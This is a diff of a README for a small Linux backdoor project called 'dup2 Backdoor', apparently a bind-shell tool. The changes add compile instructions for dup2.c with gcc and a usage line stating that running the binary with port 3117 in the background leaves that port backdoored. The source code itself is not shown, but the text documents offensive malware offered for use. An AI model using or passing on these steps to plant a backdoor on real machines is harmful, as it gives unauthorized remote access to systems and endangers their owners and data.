@@ -1,4 +1,8 @@
-dup2-backdoor
-=============
+#dup2 Backdoor
+Backdoor for Linux
 
-just another backdoor with dup2
+###How to compile
+`gcc -O2 -o dup2 dup2.c` 
+
+###To use
+`./dup2 3117 &` port 3117 will be backdoored
